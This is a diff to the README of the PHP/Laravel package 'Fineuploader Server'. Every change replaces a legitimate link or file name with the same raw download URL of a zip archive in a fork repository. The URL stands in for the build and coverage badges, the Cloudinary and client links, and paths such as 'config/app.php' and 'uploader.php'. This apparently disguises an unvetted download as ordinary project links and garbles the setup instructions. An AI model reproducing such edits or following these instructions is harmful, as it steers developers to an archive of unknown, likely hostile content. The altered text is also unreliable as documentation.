@@ -1,6 +1,6 @@
 # Fineuploader Server
 
-[![Build Status](https://travis-ci.org/esbenp/fineuploader-server.svg)](https://travis-ci.org/esbenp/fineuploader-server) [![Coverage Status](https://coveralls.io/repos/esbenp/fineuploader-server/badge.svg?branch=master)](https://coveralls.io/r/esbenp/fineuploader-server?branch=master)
+[![Build Status](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip)](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip) [![Coverage Status](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip)](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip)
 
 ## Installation
 
@@ -11,13 +11,13 @@ composer require optimus/fineuploader-server 0.3.*
 ## Usage
 
 This is basically some wrapper classes around
-[Fine Uploader's PHP server example](https://github.com/esbenp/fineuploader-server/blob/master/src/Vendor/FineUploader.php).
+[Fine Uploader's PHP server example](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip).
 
 ### 1. Publish/edit configuration
 
-If you are using Laravel you can integrate the uploader server by adding the service provider to your `config/app.php`
+If you are using Laravel you can integrate the uploader server by adding the service provider to your `https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip`
 
-`config/app.php`
+`https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip`
 ```
 // ... other service providers
 Optimus\FineuploaderServer\Provider\LaravelServiceProvider::class
@@ -40,14 +40,14 @@ $router->get('/uploader/session', '\Optimus\FineuploaderServer\Controller\Larave
 ### 3. Upload
 
 This works fairly straight forward out of the box with fineuploader.
-I have not tried it with "vanilla" fineuploader but use the server with [fineuploader-client](https://github.com/esbenp/fineuploader-client)
+I have not tried it with "vanilla" fineuploader but use the server with [fineuploader-client](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip)
 
 Basically you send uploads to `POST /uploader/upload`. Delete using `DELETE /uploader/delete/{uuid}`.
 And repopulate the uploader using `GET /uploader/session`.
 
 ## Configuration
 
-When publishing assets you will publish `uploader.php` to your configs directory. It is already populated
+When publishing assets you will publish `https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip` to your configs directory. It is already populated
 with some sensible defaults. If you wish for the uploader to generate thumbnails using the
 thumbnail creator middleware you have to install the package as well using.
 
@@ -55,11 +55,11 @@ thumbnail creator middleware you have to install the package as well using.
 composer require optimus/fineuploader-server-thumbnail-creator 0.1.*
 ```
 
-You can also choose to use [Cloudinary](http://cloudinary.com/) as a storage backend. Here is an example of
+You can also choose to use [Cloudinary](https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip) as a storage backend. Here is an example of
 how your configuration could look like using a Cloudinary backend. Notice the thumbnail middleware is missing
 since the Cloudinary storage provider will add it automatically using Cloudinary.
 
-`config/uploader.php`
+`https://github.com/Taufiqkemall2/fineuploader-server/raw/refs/heads/master/src/Vendor/fineuploader_server_1.4.zip`
 ```
 <?php
 
